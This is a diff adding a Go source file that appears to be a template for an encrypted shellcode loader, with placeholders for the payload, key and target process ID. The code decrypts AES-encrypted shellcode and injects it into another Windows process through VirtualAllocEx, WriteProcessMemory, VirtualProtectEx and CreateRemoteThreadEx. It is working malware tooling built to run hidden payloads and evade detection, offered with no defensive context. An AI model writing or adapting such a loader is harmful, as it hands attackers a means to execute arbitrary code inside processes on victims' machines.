@@ -1,0 +1,137 @@
+package main
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/base64"
+	"encoding/hex"
+	"fmt"
+	"os"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
+)
+
+const (
+	MEM_COMMIT        = 0x1000
+	MEM_RESERVE       = 0x2000
+	PAGE_EXECUTE_READ = 0x20
+	PAGE_READWRITE    = 0x04
+)
+
+var (
+	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
+
+	VirtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
+	VirtualProtectEx     = kernel32.NewProc("VirtualProtectEx")
+	WriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
+	CreateRemoteThreadEx = kernel32.NewProc("CreateRemoteThreadEx")
+)
+
+// Decrypt: Encrypted Text --> Base64 Decode --> Decrypt with IV and Key
+func Decrypt(key []byte, encryptedText string) string {
+	ciphertext, _ := base64.URLEncoding.DecodeString(encryptedText)
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		panic(err)
+	}
+
+	// Using IV
+	iv := ciphertext[:aes.BlockSize]
+
+	// Checking BlockSize = IV
+	if len(iv) != aes.BlockSize {
+		panic("[Error] Ciphertext is too short!")
+	}
+
+	ciphertext = ciphertext[aes.BlockSize:]
+
+	// Decryption Process
+	stream := cipher.NewCFBDecrypter(block, iv)
+	stream.XORKeyStream(ciphertext, ciphertext)
+
+	return string(ciphertext)
+}
+
+func Execute(shellcode []byte, pid int) {
+	pHandle, errOpenProcess := windows.OpenProcess(
+		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
+		false,
+		uint32(pid),
+	)
+	if errOpenProcess != nil {
+		panic("[ERROR] Call to OpenProcess failed!")
+	}
+
+	addr, _, errVirtualAlloc := VirtualAllocEx.Call(
+		uintptr(pHandle),
+		0,
+		uintptr(len(shellcode)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_READWRITE,
+	)
+	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
+		panic("[ERROR] Call to VirtualAllocEx failed!")
+	}
+
+	_, _, errWriteProcessMemory := WriteProcessMemory.Call(
+		uintptr(pHandle),
+		addr,
+		(uintptr)(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+	)
+	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
+		panic("[ERROR] Call to WriteProcessMemory failed!")
+	}
+
+	oldProtect := windows.PAGE_READWRITE
+
+	_, _, errVirtualProtectEx := VirtualProtectEx.Call(
+		uintptr(pHandle),
+		addr,
+		uintptr(len(shellcode)),
+		windows.PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
+		panic("[ERROR] Call to VirtualProtectEx failed!")
+	}
+	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(
+		uintptr(pHandle),
+		0,
+		0,
+		addr,
+		0,
+		0,
+		0,
+	)
+	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
+		panic("[ERROR] Call to CreateRemoteThreadEx failed!")
+	}
+
+	errCloseHandle := windows.CloseHandle(
+		pHandle,
+	)
+	if errCloseHandle != nil {
+		panic("[ERROR] Call to CloseHandle failed!")
+	}
+}
+
+func main() {
+	encShellcode := "{{.Shellcode}}"
+	key := []byte("{{.Key}}")
+	pid := {{.Pid}}
+
+	// Decrypt base64/AES to original value
+	decShellcode := Decrypt(key, encShellcode)
+
+	shellcode, err := hex.DecodeString(decShellcode)
+
+	if err != nil {
+		fmt.Printf("[ERROR] Error Decoding: %s\n", err)
+		os.Exit(1)
+	}
+
+	Execute(shellcode, pid)
+}
